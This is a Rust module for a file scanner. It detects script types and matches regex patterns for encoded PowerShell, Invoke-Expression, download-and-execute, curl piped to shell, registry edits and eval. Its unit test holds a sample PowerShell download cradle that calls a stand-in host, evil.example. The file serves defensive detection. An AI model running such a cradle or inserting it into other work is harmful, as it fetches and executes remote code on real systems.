//! Script static analysis (Phase 4).

use std::path::Path;

use async_trait::async_trait;
use serde_json::json;

use super::trait_def::{FileScanner, ScannerContext, ScannerOutput};
use crate::models::ScanFinding;

const SCRIPT_EXTENSIONS: &[&str] = &["js", "ps1", "bat", "cmd", "sh", "bash", "py", "vbs"];

const SCRIPT_PATTERNS: &[(&str, &str, &str, u8)] = &[
    (
        r"(?i)powershell\s.*-enc(odedcommand)?",
        "SCRIPT_ENCODED_COMMAND",
        "PowerShell encoded command detected",
        45,
    ),
    (
        r"(?i)frombase64string",
        "SCRIPT_BASE64_PAYLOAD",
        "Base64 decode pattern detected",
        35,
    ),
    (
        r"(?i)(iex|invoke-expression)",
        "SCRIPT_INVOKE_EXPRESSION",
        "Invoke-Expression (iex) detected",
        40,
    ),
    (
        r"(?i)(downloadstring|downloadfile|wget|curl)\s",
        "SCRIPT_DOWNLOAD_EXECUTE",
        "Download pattern detected",
        35,
    ),
    (
        r"(?i)curl\s+[^\|]+\|\s*(ba)?sh",
        "SCRIPT_DOWNLOAD_EXECUTE",
        "curl piped to shell detected",
        50,
    ),
    (
        r"(?i)(cmd\.exe|/c\s+)",
        "SCRIPT_SHELL_EXECUTION",
        "Shell execution pattern detected",
        30,
    ),
    (
        r"(?i)reg\s+add",
        "SCRIPT_REGISTRY_MODIFY",
        "Registry modification pattern detected",
        35,
    ),
    (
        r"(?i)(eval\s*\(|new-function\s)",
        "SCRIPT_OBFUSCATION",
        "Dynamic evaluation or obfuscation pattern",
        30,
    ),
];

pub struct ScriptAnalyzer;

fn detect_script_kind(filename: &str, content: &str) -> Option<&'static str> {
    let ext = Path::new(filename)
        .extension()
        .and_then(|e| e.to_str())
        .map(str::to_ascii_lowercase);

    if let Some(ext) = ext.as_deref() {
        if SCRIPT_EXTENSIONS.contains(&ext) {
            return Some(match ext {
                "js" => "javascript",
                "ps1" => "powershell",
                "bat" | "cmd" => "batch",
                "sh" | "bash" => "shell",
                "py" => "python",
                "vbs" => "vbscript",
                _ => "script",
            });
        }
    }

    let trimmed = content.trim_start();
    if trimmed.starts_with("#!") {
        let shebang = trimmed.lines().next().unwrap_or("");
        if shebang.contains("python") {
            return Some("python");
        }
        if shebang.contains("bash") || shebang.contains("/sh") {
            return Some("shell");
        }
        if shebang.contains("node") {
            return Some("javascript");
        }
        return Some("script");
    }

    None
}

pub fn analyze_script_content(content: &str, script_kind: &str) -> Vec<ScanFinding> {
    let mut findings = Vec::new();
    let mut seen_codes = std::collections::HashSet::new();

    for (pattern, code, message, severity) in SCRIPT_PATTERNS {
        let Ok(re) = regex::Regex::new(pattern) else {
            continue;
        };
        if re.is_match(content) && seen_codes.insert(*code) {
            findings.push(ScanFinding {
                engine: "SCRIPT_ANALYZER".into(),
                code: (*code).into(),
                category: "script".into(),
                severity: *severity,
                confidence: 75,
                message: (*message).into(),
                technical_details: Some(json!({
                    "scriptKind": script_kind,
                    "pattern": pattern,
                })),
                path_inside_archive: None,
            });
        }
    }

    findings
}

#[async_trait]
impl FileScanner for ScriptAnalyzer {
    fn name(&self) -> &'static str {
        "SCRIPT_ANALYZER"
    }

    async fn scan(&self, ctx: &ScannerContext) -> anyhow::Result<ScannerOutput> {
        let data = tokio::fs::read(&ctx.file_path).await?;
        let content = String::from_utf8_lossy(&data);

        let Some(script_kind) = detect_script_kind(&ctx.original_filename, &content) else {
            return Ok(ScannerOutput {
                engine: self.name().into(),
                version: Some("script-static-v1".into()),
                complete: true,
                findings: vec![],
                metadata: Some(json!({ "skipped": true })),
            });
        };

        let mut findings = analyze_script_content(&content, script_kind);
        for f in &mut findings {
            f.path_inside_archive = ctx.path_inside_archive.clone();
        }

        Ok(ScannerOutput {
            engine: self.name().into(),
            version: Some("script-static-v1".into()),
            complete: true,
            findings,
            metadata: Some(json!({ "scriptKind": script_kind })),
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_iex_in_powershell() {
        let content = "IEX (New-Object Net.WebClient).DownloadString('http://evil.example/a')";
        let findings = analyze_script_content(content, "powershell");
        assert!(findings.iter().any(|f| f.code == "SCRIPT_INVOKE_EXPRESSION"));
    }

    #[test]
    fn detects_by_extension() {
        let kind = detect_script_kind("run.ps1", "");
        assert_eq!(kind, Some("powershell"));
    }
}
